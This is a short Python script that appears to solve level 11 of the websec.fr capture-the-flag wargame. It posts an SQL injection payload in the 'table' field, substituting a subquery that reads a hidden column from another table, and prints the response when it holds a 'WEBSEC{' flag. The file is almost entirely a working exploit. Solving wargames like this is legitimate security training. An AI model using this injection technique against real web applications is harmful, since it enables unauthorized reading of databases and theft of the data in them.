import requests
import re


url = "https://websec.fr/level11/index.php"
data = {
    "user_id": "2",
    "table": "(select 2 id, enemy username from costume)",
    "submit": "Submit"
}
req = requests.post(url=url, data=data)
if req.status_code == 200:
    if "WEBSEC{" in req.text:
        print(req.text)
